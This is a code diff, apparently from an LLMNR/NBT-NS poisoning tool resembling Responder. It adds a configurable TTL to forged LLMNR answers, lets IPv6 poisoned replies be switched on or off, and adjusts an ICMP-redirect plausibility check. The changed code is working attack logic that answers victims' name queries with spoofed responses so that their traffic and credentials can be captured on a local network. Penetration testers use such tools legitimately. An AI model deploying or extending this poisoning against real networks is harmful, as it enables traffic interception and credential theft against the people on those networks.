@@ -22,6 +22,9 @@ if (sys.version_info > (3, 0)):
 else:
 	from SocketServer import BaseRequestHandler
 
+#Should we answer to those AAAA?
+Have_IPv6 = settings.Config.IPv6
+
 def Parse_LLMNR_Name(data):
 	import codecs
 	NameLen = data[12]
@@ -41,7 +44,7 @@ def IsICMPRedirectPlausible(IP):
 			elif ip[0] == 'nameserver':
 				dnsip.extend(ip[1:])
 		for x in dnsip:
-			if x != "127.0.0.1" and IsOnTheSameSubnet(x,IP) is False:
+			if x != "127.0.0.1" and IsIPv6IP(x) is False and IsOnTheSameSubnet(x,IP) is False:	#Temp fix to ignore IPv6 DNS addresses
 				print(color("[Analyze mode: ICMP] You can ICMP Redirect on this network.", 5))
 				print(color("[Analyze mode: ICMP] This workstation (%s) is not on the same subnet than the DNS server (%s)." % (IP, x), 5))
 				print(color("[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.", 5))
@@ -73,7 +76,11 @@ class LLMNR(BaseRequestHandler):  # LLMNR Server class
 							})
 
 				elif LLMNRType == True:  # Poisoning Mode
-					Buffer1 = LLMNR_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=Name)
+					#Default:
+					if settings.Config.TTL == None:
+						Buffer1 = LLMNR_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=Name)
+					else:
+						Buffer1 = LLMNR_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=Name, TTL=settings.Config.TTL)
 					Buffer1.calculate()
 					soc.sendto(NetworkSendBufferPython2or3(Buffer1), self.client_address)
 					if not settings.Config.Quiet_Mode:
@@ -86,8 +93,12 @@ class LLMNR(BaseRequestHandler):  # LLMNR Server class
 							'AnalyzeMode': '0',
 							})
 
-				elif LLMNRType == 'IPv6':
-					Buffer1 = LLMNR6_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=Name)
+				elif LLMNRType == 'IPv6' and Have_IPv6:
+					#Default:
+					if settings.Config.TTL == None:
+						Buffer1 = LLMNR6_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=Name)
+					else:
+						Buffer1 = LLMNR6_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=Name, TTL=settings.Config.TTL)
 					Buffer1.calculate()
 					soc.sendto(NetworkSendBufferPython2or3(Buffer1), self.client_address)
 					if not settings.Config.Quiet_Mode:
